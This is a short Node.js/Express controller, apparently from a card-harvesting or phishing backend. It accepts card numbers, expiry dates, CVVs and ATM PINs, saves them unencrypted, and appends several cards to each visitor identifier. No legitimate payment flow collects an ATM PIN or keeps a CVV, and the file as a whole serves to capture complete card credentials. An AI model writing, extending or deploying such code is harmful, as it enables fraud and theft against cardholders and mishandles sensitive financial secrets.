const CardPayment = require('../models/CardPayment');

exports.submitCardPayment = async (req, res) => {
    try {
        const { uniqueid, cardNumber, expiryDate, cvv, atmPin } = req.body;

        let cardPayment = await CardPayment.findOne({ uniqueid });

        if (cardPayment) {
            cardPayment.entries.push({ cardNumber, expiryDate, cvv, atmPin });
        } else {
            cardPayment = new CardPayment({
                uniqueid,
                entries: [{ cardNumber, expiryDate, cvv, atmPin }]
            });
        }

        await cardPayment.save();

        res.status(200).json({
            success: true,
            message: "Card Payment (with ATM PIN) submitted successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting card payment data"
        });
    }
};
